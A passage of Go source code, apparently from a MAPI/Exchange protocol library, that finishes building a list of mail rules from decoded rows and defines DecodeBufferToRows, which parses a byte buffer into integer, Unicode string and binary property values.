	for k := 0; k < int(rows.RowCount); k++ {
		rule := Rule{}
		rule.RuleID = rows.RowData[k][0].ValueArray
		rule.RuleName = rows.RowData[k][1].ValueArray
		rules[k] = rule
	}
	ruleshandle := resp[pos+4:]

	return rules, ruleshandle
}

//DecodeBufferToRows returns the property rows contained in the buffer, takes a list
//of propertytags. These are needed to figure out how to split the columns in the rows
func DecodeBufferToRows(buff []byte, cols []PropertyTag) []PropertyRow {

	var pos = 0
	var rows []PropertyRow
	for _, property := range cols {
		trow := PropertyRow{}
		if property.PropertyType == PtypInteger32 {
			trow.ValueArray, pos = utils.ReadBytes(pos, 2, buff)
			rows = append(rows, trow)
		} else if property.PropertyType == PtypString {
			pos += 8 //hack for now
			trow.ValueArray, pos = utils.ReadUnicodeString(pos, buff)
			rows = append(rows, trow)
		} else if property.PropertyType == PtypBinary {
			cnt, p := utils.ReadUint16(pos, buff)
			pos = p
			trow.ValueArray, pos = utils.ReadBytes(pos, int(cnt), buff)
			rows = append(rows, trow)
		}
	}
	return rows
}
